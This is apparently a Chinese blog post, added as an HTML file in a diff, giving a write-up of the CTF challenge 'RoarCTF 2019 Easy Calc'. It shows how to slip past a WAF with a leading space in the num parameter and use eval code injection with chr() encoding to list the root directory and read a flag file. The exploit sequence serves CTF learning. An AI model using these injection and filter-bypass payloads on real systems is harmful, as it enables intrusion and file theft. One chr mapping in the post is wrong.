@@ -1,0 +1,338 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="我要干饭！">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.3.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://xjuun.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="web,chr,scandir" />
+
+
+<meta name="description" content="尝试后发现，只能输入数字，查看网页源代码，可以看见calc.php,尝试打开calc.php，发现其过滤字符列表，如图：
+
+可以打开，并且显示了源码
+
+foreach 语法结构提供了遍历数组的简..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    RoarCTF 2019 Easy Calc 1 |
+    
+    我要干饭！
+</title>
+
+<link rel="alternate" href="/atom.xml" title="我要干饭！" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='我要干饭！'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <img src="/img/branding.png" alt="Snippet 博客主题" class="img-responsive center-block">
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://xjuun.github.io">
+                        我要干饭！</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/CTF/"><i class="fa "></i>
+                                CTF</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/网安笔记/"><i class="fa "></i>
+                                网安笔记</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/语言学习/"><i class="fa "></i>
+                                语言学习</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/小爱好/"><i class="fa "></i>
+                                小爱好</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/工具/"><i class="fa "></i>
+                                工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/随笔/"><i class="fa "></i>
+                                随笔</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/about/"><i class="fa "></i>
+                                关于我</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="RoarCTF 2019 Easy Calc 1">
+            
+            RoarCTF 2019 Easy Calc 1
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/chr/" rel="tag">chr</a> <a class="tag-none-link" href="/tags/scandir/" rel="tag">scandir</a> <a class="tag-none-link" href="/tags/web/" rel="tag">web</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2022/04/19</span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>尝试后发现，只能输入数字，<br><img src="https://img-blog.csdnimg.cn/f8009643d5354d9abb63a0470887d5b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeGluanV1bg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看网页源代码，可以看见calc.php,<img src="https://img-blog.csdnimg.cn/33bbffe0fcbd41f784ee93846c07a9bc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeGluanV1bg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>尝试打开calc.php，发现其过滤字符列表，如图：<br><img src="https://img-blog.csdnimg.cn/0d58c526122a4127b67e4f076a6030da.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeGluanV1bg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>可以打开，并且显示了源码</p>
+</blockquote>
+<p>foreach 语法结构提供了遍历数组的简单方式。<br>语法:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>
+
+<p>在这道题里，会对黑名单中的每一个值都拿出来连接成正则表达式的字符串，<code>/m</code>表示多行查找<br>其他几个参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="title function_ invoke__">i</span> (忽略大小写)</span><br><span class="line">/<span class="title function_ invoke__">g</span> (全文查找出现的所有匹配字符)</span><br><span class="line">/<span class="title function_ invoke__">m</span> (多行查找)</span><br><span class="line">/<span class="title function_ invoke__">gi</span>(全文查找、忽略大小写)</span><br><span class="line">/<span class="title function_ invoke__">ig</span>(全文查找、忽略大小写)</span><br></pre></td></tr></table></figure>
+
+<p>假如绕过的话，我们就可以用eval执行任意php语句</p>
+<p>给num参数传参，发现只能传数字，说明与WAF问题，</p>
+<blockquote>
+<p>WAF的问题：WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF</p>
+</blockquote>
+<p>这里利用PHP的字符串解析特性来绕过WAF，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php? num=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+<p>scandir(/)可以查看根目录下的所有文件,用chr()来绕过waf,注意在calc.php页面提交<br>所以就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">这里由于单引号被过滤了，那就用<span class="title function_ invoke__">chr</span>()绕过，<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)就是斜杠/</span><br><span class="line">? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)));</span><br></pre></td></tr></table></figure>
+<p>打开后，发现flagg文件，打开文件，即可发现flag，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flagg&#x27;</span>));</span><br><span class="line">这里/=<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)，f=<span class="title function_ invoke__">chr</span>(<span class="number">102</span>),l=<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),a=<span class="title function_ invoke__">chr</span>(<span class="number">97</span>),g=<span class="title function_ invoke__">chr</span>(<span class="number">103</span>),g=<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)来进行绕过</span><br><span class="line">? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)));</span><br></pre></td></tr></table></figure>
+<p>总结;<br>1、scandir(‘/‘)，foreach函数的运用<br>2、chr码的简单应用</p>
+
+    </div>
+    
+    <div class="post-footer">
+        <div>
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2022/04/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload%201/" class="pre-post btn btn-default" title='极客大挑战 2019 Upload 1'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            极客大挑战 2019 Upload 1</span>
+    </a>
+    
+    
+    <a href="/2022/04/19/GXYCTF2019-Ping-Ping-Ping-1/" class="next-post btn btn-default" title='GXYCTF2019 Ping Ping Ping 1'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            GXYCTF2019 Ping Ping Ping 1</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<p>评论系统未开启，无法评论！</p>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <p>暂无目录</p>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2021
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+</body>
+</html>
